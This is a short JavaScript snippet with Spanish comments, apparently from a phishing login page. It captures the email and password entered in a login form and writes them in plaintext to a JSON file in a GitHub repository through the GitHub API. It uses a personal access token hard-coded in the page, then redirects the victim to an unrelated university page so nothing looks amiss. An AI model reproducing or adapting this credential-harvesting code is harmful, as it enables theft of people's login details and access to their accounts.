<script>
// Configuración GitHub
const token = 'TU_TOKEN_AQUI'; // Tu token personal de GitHub
const owner = 'TU_USUARIO';
const repo = 'NOMBRE_REPO';
const path = 'datos.json';

const loginForm = document.getElementById('loginForm');

// Función para guardar datos en GitHub
async function guardarDatosGitHub(email, password) {
  const res = await fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${path}`);
  const data = await res.json();
  const contenido = JSON.parse(atob(data.content));

  contenido.push({ email, password, fecha: new Date().toLocaleString() });

  await fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${path}`, {
    method: 'PUT',
    headers: {
      'Authorization': `token ${token}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      message: 'Actualizar datos',
      content: btoa(JSON.stringify(contenido, null, 2)),
      sha: data.sha
    })
  });
}

// Enviar formulario
loginForm.addEventListener('submit', function(e){
  e.preventDefault();
  const email = this.email.value;
  const password = this.password.value;

  // Guardar en GitHub y luego redirigir
  guardarDatosGitHub(email, password)
    .then(() => {
      // Redirigir al enlace que tenías
      window.location.href = "https://www.bu.edu/lernet/artemis/years/2017/projects/StudentWebsites/Michelle/pages/BlackPink.html";
    })
    .catch(err => console.error(err));
});
</script>

